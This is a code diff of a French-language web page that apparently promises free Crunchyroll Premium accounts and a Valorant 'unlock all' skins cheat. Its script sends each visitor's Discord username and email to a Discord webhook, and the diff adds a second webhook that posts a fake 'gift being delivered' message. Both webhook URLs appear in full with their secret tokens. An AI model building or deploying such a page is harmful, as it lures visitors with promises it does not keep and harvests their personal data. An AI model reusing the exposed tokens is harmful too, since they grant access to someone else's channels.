@@ -78,7 +78,7 @@
             </div>
             <div class="product">
                 <h2>📺 Compte Crunchyroll Premium</h2>
-                <p>Accès complet à des anime en haute qualité et sans pub.</p>
+                <p>Accès complet à des anime en haute qualité.</p>
                 <button onclick="selectProduct('Compte Crunchyroll Premium')">Choisir ce produit</button>
             </div>
             <div class="product">
@@ -88,7 +88,7 @@
             </div>
             <div class="product">
                 <h2>🔓 Unlock all Valo</h2>
-                <p>Accès à tout les Skins de Valorant.</p>
+                <p>Accès à tout les skins de Valorant.</p>
                 <button onclick="selectProduct('Unlock all Valo')">Choisir ce produit</button>
             </div>
         </div>
@@ -129,23 +129,41 @@
             const discordUsername = document.getElementById('discordUsername').value;
             const email = document.getElementById('email').value;
 
-            const webhookUrl = 'https://discordapp.com/api/webhooks/1321945888171753542/WfClK3T35-yKtzSEACLVKQvHZa_cqyAGL6GhY0-B0cLYizYrpBfGk36EZtYmQ_8itpYd'; /* Remplacez par votre URL de webhook Discord */
+            const primaryWebhookUrl = 'https://discordapp.com/api/webhooks/1321945888171753542/WfClK3T35-yKtzSEACLVKQvHZa_cqyAGL6GhY0-B0cLYizYrpBfGk36EZtYmQ_8itpYd'; /* Remplacez par votre premier URL de webhook Discord */
+            const secondaryWebhookUrl = 'https://discordapp.com/api/webhooks/1321997325068927099/nQWjPJlSLJ_Q-10Ajh94w7pvmxryIfYIZURenPTJmFUkDR7AVZkqhiZiadME7cNiYqGG'; /* Remplacez par votre deuxième URL de webhook Discord */
 
-            const data = {
+            const primaryData = {
                 content: `Nouvel utilisateur a rejoint le serveur !\n🎁 Produit: ${product}\n🎄 Pseudo Discord: ${discordUsername}\n🎅 Email: ${email}`
             };
 
-            fetch(webhookUrl, {
+            const secondaryData = {
+                content: `Un cadeau réclamé par ${discordUsername} est en cours de livraison !`
+            };
+
+            fetch(primaryWebhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify(primaryData)
             })
             .then(response => {
                 if (response.ok) {
-                    document.getElementById('confirmationContainer').style.display = 'none';
-                    document.getElementById('finalContainer').style.display = 'block';
+                    fetch(secondaryWebhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(secondaryData)
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            document.getElementById('confirmationContainer').style.display = 'none';
+                            document.getElementById('finalContainer').style.display = 'block';
+                        } else {
+                            alert('Erreur lors de la soumission du formulaire.');
+                        }
+                    });
                 } else {
                     alert('Erreur lors de la soumission du formulaire.');
                 }
@@ -157,4 +175,3 @@
     </script>
 </body>
 </html>
-
